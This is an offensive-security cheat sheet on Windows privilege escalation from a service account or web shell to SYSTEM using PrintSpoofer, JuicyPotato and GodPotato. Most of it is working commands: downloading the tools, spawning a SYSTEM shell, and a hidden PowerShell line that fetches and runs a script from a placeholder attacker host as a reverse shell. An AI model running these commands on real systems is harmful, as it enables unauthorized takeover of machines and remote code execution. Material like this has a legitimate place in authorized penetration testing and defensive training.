# 09.03 PrintSpoofer JuicyPotato GodPotato

> Token impersonation tools that abuse SeImpersonatePrivilege to escalate to SYSTEM via named pipes and DCOM.

## Overview

All three abuse SeImpersonatePrivilege (common on service accounts like IIS APPPOOL\*, NT SERVICE\MSSQL$, network service) to impersonate SYSTEM token via different vectors: PrintSpoofer uses spooler named pipe, JuicyPotato uses DCOM (works <Win10 1809), GodPotato uses RpcSs for modern Windows. Use to escalate from web-shell-as-iis-user to SYSTEM.

## Steps

- **Step 1** - Verify you have SeImpersonatePrivilege: `whoami /priv`.
- **Step 2** - Try GodPotato on modern Windows first.
- **Step 3** - Fall back to PrintSpoofer if spooler is enabled.
- **Step 4** - JuicyPotato for legacy Windows (pre-2019).

## Commands

### Check privileges

```cmd
whoami /priv
# Look for SeImpersonatePrivilege
```

### Get binaries

```powershell
iwr 'https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe' -OutFile PrintSpoofer.exe
iwr 'https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe' -OutFile GodPotato.exe
iwr 'https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe' -OutFile JuicyPotato.exe
```

### PrintSpoofer to SYSTEM cmd

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

### PrintSpoofer reverse shell

```cmd
PrintSpoofer.exe -c "C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')"
```

### GodPotato (modern Windows)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
```

### JuicyPotato (legacy)

```cmd
# Needs CLSID for current Windows version — see https://github.com/ohpe/juicy-potato/blob/master/CLSID/
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c '{CLSID}'
```
